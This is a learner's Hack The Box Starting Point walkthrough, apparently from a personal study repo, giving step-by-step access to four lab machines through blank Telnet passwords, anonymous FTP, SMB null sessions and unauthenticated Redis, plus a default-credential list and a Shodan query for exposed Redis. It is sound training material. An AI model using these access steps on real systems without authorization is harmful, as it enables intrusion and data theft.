# Hack The Box — Starting Point Walkthrough

**Author:** Nivedhitha KS | **Day:** 15 of 60  
**GitHub:** github.com/NivedhithaKS-SEC/cybersec-journey

---

## Setting Up HTB

### Account Creation
1. Go to `hackthebox.com` → Sign Up
2. Verify email
3. Profile → set to **Public** (important for portfolio)
4. Note your username — this appears on your HTB profile card

### VPN Connection (Required)
HTB machines run on private networks. You must connect via VPN before you can reach any machine.

```bash
# Step 1: Download your VPN config
# HTB Dashboard → Connect → Labs → Download VPN

# Step 2: Connect (keep this terminal open the whole session)
sudo openvpn ~/Downloads/your_username.ovpn

# You'll see:
# Initialization Sequence Completed
# This means VPN is connected

# Step 3: Verify — you should have a tun0 interface
ip addr show tun0
# or
ifconfig tun0

# Your HTB IP (tun0 address) will be something like 10.10.x.x
# Target machines will also be on the 10.10.x.x range
```

---

## Starting Point — Tier 0

Tier 0 machines are the absolute easiest — designed to teach basic tool usage and fundamental concepts. Each machine focuses on one concept.

---

## Machine 1 — Meow

**IP:** (shown when you spawn the machine)  
**OS:** Linux  
**Difficulty:** Very Easy  
**Concept:** Telnet + default/blank credentials

### Background
Telnet is an old remote access protocol (port 23). It sends everything in plaintext. Many old routers, IoT devices, and misconfigured servers still run Telnet with blank or default passwords.

### Step-by-step

**Step 1 — Verify connectivity**
```bash
ping -c 3 TARGET_IP
# Should get replies — confirms VPN is working and machine is up
```

**Step 2 — Nmap scan**
```bash
nmap -sV TARGET_IP
# Expected output:
# PORT   STATE SERVICE VERSION
# 23/tcp open  telnet  Linux telnetd
```

**Step 3 — Connect via Telnet**
```bash
telnet TARGET_IP
# Meow login: root
# Password: (just press Enter — blank password)
```

**Step 4 — Get the flag**
```bash
ls
cat flag.txt
# Flag: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX (submit this on HTB)
```

### What you learned
- Telnet is unencrypted and often misconfigured with blank credentials
- Real IoT devices (cameras, routers) are frequently compromised this way
- Mirai botnet (2016, took down half the internet) exploited exactly this — default Telnet credentials on IoT devices

---

## Machine 2 — Fawn

**IP:** (shown when you spawn the machine)  
**OS:** Linux  
**Difficulty:** Very Easy  
**Concept:** FTP anonymous login

### Background
FTP (File Transfer Protocol) on port 21. Many servers are misconfigured to allow **anonymous login** — a guest account that requires no password. Attackers can read (and sometimes write) files without authentication.

### Step-by-step

**Step 1 — Nmap scan**
```bash
nmap -sV TARGET_IP
# PORT   STATE SERVICE VERSION
# 21/tcp open  ftp     vsftpd 3.0.3
```

**Step 2 — Check if anonymous login works**
```bash
# Nmap script check
nmap --script ftp-anon TARGET_IP
# If vulnerable: Anonymous FTP login allowed
```

**Step 3 — Connect and retrieve flag**
```bash
ftp TARGET_IP
# Name: anonymous
# Password: (press Enter, or type any email like guest@guest.com)

# FTP commands:
ls              # List files
ls -la          # List all files including hidden
cd directory    # Change directory
get flag.txt    # Download flag.txt to your local machine
mget *.txt      # Download all .txt files
quit            # Exit FTP
```

**Step 4 — Read the flag**
```bash
# Back in your terminal:
cat flag.txt
```

### What you learned
- Anonymous FTP is a **reportable vulnerability** in VDP/bug bounty programs
- Real-world FTP misconfigs expose: backups, config files, database dumps
- Always check FTP in your recon — `nmap --script ftp-anon TARGET_IP`

---

## Machine 3 — Dancing

**IP:** (shown when you spawn the machine)  
**OS:** Windows  
**Difficulty:** Very Easy  
**Concept:** SMB null session / anonymous shares

### Background
SMB (Server Message Block) on port 445. Windows file sharing protocol. **Null sessions** allow listing shared folders without authentication. Even with auth required, share names are often revealed.

### Step-by-step

**Step 1 — Nmap scan**
```bash
nmap -sV TARGET_IP
# 445/tcp open  microsoft-ds Windows 10 microsoft-ds
```

**Step 2 — List SMB shares**
```bash
# Method 1: smbclient
smbclient -L //TARGET_IP -N
# -L = list shares
# -N = no password (null session)

# Expected output:
# Sharename       Type      Comment
# ---------       ----      -------
# ADMIN$          Disk      Remote Admin
# C$              Disk      Default share
# IPC$            IPC       Remote IPC
# WorkShares      Disk      

# Method 2: enum4linux
enum4linux -S TARGET_IP    # -S = shares only
```

**Step 3 — Connect to accessible share**
```bash
# Try connecting to each non-default share (WorkShares in this case)
smbclient //TARGET_IP/WorkShares -N

# SMB commands:
ls              # List files
cd directory    # Change directory
get flag.txt    # Download file
exit            # Exit
```

**Step 4 — Navigate to find the flag**
```bash
# Inside SMB session:
ls
cd James.P
ls
get flag.txt
```

### What you learned
- SMB null sessions expose share names even on patched systems
- Named shares that allow anonymous read access are reportable
- `enum4linux` and `smbclient` are essential enumeration tools

---

## Machine 4 — Redeemer

**IP:** (shown when you spawn the machine)  
**OS:** Linux  
**Difficulty:** Very Easy  
**Concept:** Redis unauthenticated access

### Background
Redis is an in-memory database often used as a cache. When exposed without authentication (default config), anyone can read/write all data in the database.

### Step-by-step

**Step 1 — Nmap scan**
```bash
nmap -sV -p- TARGET_IP
# You need -p- because Redis runs on port 6379 (non-standard)
# 6379/tcp open  redis  Redis key-value store
```

**Step 2 — Connect to Redis**
```bash
# Install redis-cli if needed
sudo apt install redis-tools

# Connect (no auth needed)
redis-cli -h TARGET_IP
```

**Step 3 — Enumerate and get flag**
```bash
# Inside redis-cli:
info server         # Server info
info keyspace       # See what databases have keys
keys *              # List all keys
get flag           # Get value of key named "flag"
```

### What you learned
- Databases should never be exposed to the internet without authentication
- Redis, MongoDB, Elasticsearch, Cassandra — all have historically been found exposed
- Shodan query: `port:6379` finds thousands of exposed Redis instances

---

## HTB Methodology Template

Use this for every machine you attempt:

```markdown
## Machine: [Name]
**Date:** 
**IP:** 
**OS:** 
**Difficulty:** 

### Recon
nmap output:
[paste nmap results here]

### Enumeration
What services did you find?
What version numbers?
What did searchsploit show?

### Exploitation
What vulnerability did you exploit?
What exact command/payload?

### Post Exploitation
What did you find after getting in?
How did you escalate (if needed)?

### Flag
user.txt: [flag value]
root.txt: [flag value]

### Lessons Learned
What was the key vulnerability?
What tool/technique was most important?
What would you do differently?
```

---

## HTB Points Reference

| Machine type | Points on solve |
|-------------|----------------|
| Starting Point Tier 0 | 0 pts (but gives you access to Tier 1) |
| Starting Point Tier 1 | 10 pts per machine |
| Starting Point Tier 2 | 20 pts per machine |
| Easy machines | 20 pts |
| Medium machines | 30 pts |
| Hard machines | 40 pts |
| Insane machines | 50 pts |

---

## Common HTB Mistakes (Avoid These)

| Mistake | Fix |
|---------|-----|
| VPN not connected | Always run `ip addr show tun0` before starting |
| Machine not spawned | Click "Spawn Machine" — note the IP |
| Wrong target IP | Machines reset — always use currently spawned IP |
| Not doing full port scan | Use `-p-` — services often on high ports |
| Skipping enumeration | Always run nikto + gobuster on web ports |
| Giving up too fast | Try every credential: `admin:admin`, `root:root`, `guest:guest` |

---

## My HTB Progress

| Machine | Tier | Date | Flag | Notes |
|---------|------|------|------|-------|
| Meow | Tier 0 | 27-03-2026 | ✅ | Telnet blank root password |
| Fawn | Tier 0 | | | |
| Dancing | Tier 0 | | | |
| Redeemer | Tier 0 | | | |

*(Update as you complete each machine)*

---

*Day 15 — 60-Day Cybersecurity Journey | github.com/NivedhithaKS-SEC/cybersec-journey*
